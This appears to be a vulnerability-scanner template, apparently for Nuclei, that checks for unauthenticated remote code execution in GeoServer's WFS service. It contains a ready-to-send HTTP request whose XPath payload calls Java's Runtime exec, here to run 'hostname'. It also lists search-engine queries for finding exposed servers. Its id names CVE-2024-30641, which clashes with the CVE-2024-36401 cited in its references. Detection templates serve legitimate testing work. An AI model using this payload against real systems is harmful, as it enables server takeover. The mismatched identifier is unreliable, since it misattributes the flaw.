id: geoserver-rce-CVE-2024-30641

info:
  name: GeoServer RCE in Evaluating Property Name Expressions
  author: hanc00l
  severity: critical
  description: |
    In the GeoServer version prior to 2.25.1, 2.24.3 and 2.23.5 of GeoServer, multiple OGC request parameters allow Remote Code Execution (RCE) by unauthenticated users through specially crafted input against a default GeoServer installation due to unsafely evaluating property names as XPath expressions.
  reference:
    - https://x.com/sirifu4k1/status/1808270303275241607
    - https://nvd.nist.gov/vuln/detail/CVE-2024-36401
    - https://github.com/vulhub/vulhub/tree/master/geoserver/CVE-2024-36401
    - https://github.com/advisories/GHSA-6jj6-gm7p-fcvv
  metadata:
    verified: true
    max-request: 1
    vendor: osgeo
    product: geoserver
    shodan-query: "Server: GeoHttpServer"
    fofa-query:
      - title="geoserver"
      - app="geoserver"
    google-query: intitle:"geoserver"

http:
  - raw:
      - |-
        POST /geoserver/wfs HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
        Connection: close
        Content-Type: application/xml
        Content-Length: 345

        <wfs:GetPropertyValue service='WFS' version='2.0.0'
         xmlns:topp='http://www.openplans.org/topp'
         xmlns:fes='http://www.opengis.net/fes/2.0'
         xmlns:wfs='http://www.opengis.net/wfs/2.0'>
          <wfs:Query typeNames='sf:archsites'/>
          <wfs:valueReference>exec(java.lang.Runtime.getRuntime(),'hostname')</wfs:valueReference>
        </wfs:GetPropertyValue>
        
    matchers-condition: and
    matchers:
        - type: word
          part: body
          words:
            - "java.lang.ProcessImpl"
            - "ows:ExceptionText"

        - type: word
          part: content_type
          words:
            - "application/xml"